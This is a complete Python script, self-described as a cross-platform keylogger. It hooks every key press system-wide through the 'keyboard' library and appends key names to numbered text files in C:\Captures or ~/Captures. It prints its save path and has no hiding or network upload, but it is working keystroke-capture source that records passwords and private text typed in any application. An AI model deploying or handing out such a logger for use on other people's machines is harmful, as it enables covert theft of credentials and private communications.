r"""
Cross-platform keylogger.
- Windows: saves to C:\Captures\
- Linux/macOS: saves to ~/Captures/
- Auto-increments: file1.txt, file2.txt, ...
- Enter -> newline (no comma)
- Every other key -> exact key name + ','
- Comma key itself -> 'comma'
"""

import os
import sys
import re
import platform

try:
    import keyboard
except ImportError:
    print("Install the 'keyboard' library: pip install keyboard")
    sys.exit(1)


def get_capture_dir():
    if platform.system() == "Windows":
        path = r"C:\Captures"
    else:
        path = os.path.expanduser("~/Captures")
    os.makedirs(path, exist_ok=True)
    return path


def get_next_filename(directory):
    pattern = re.compile(r"^file(\d+)\.txt$")
    max_num = 0
    try:
        for name in os.listdir(directory):
            m = pattern.match(name)
            if m:
                max_num = max(max_num, int(m.group(1)))
    except FileNotFoundError:
        pass
    return os.path.join(directory, f"file{max_num + 1}.txt")


def main():
    capture_dir = get_capture_dir()
    log_path = get_next_filename(capture_dir)

    print(f"Saving keystrokes to: {log_path}")
    print("Press Ctrl+C in this terminal to stop.\n")

    def write(text):
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(text)

    def on_press(event):
        name = event.name

        # Enter -> newline only
        if name in ("enter", "return"):
            write("\n")
            return

        # Comma key itself -> the word "comma"
        if name == ",":
            write("comma,")
            return

        # Everything else -> exact key name + comma
        write(name + ",")

    try:
        keyboard.on_press(on_press)
        keyboard.wait()
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\nStopped. Keystrokes saved to: {log_path}")


if __name__ == "__main__":
    main()
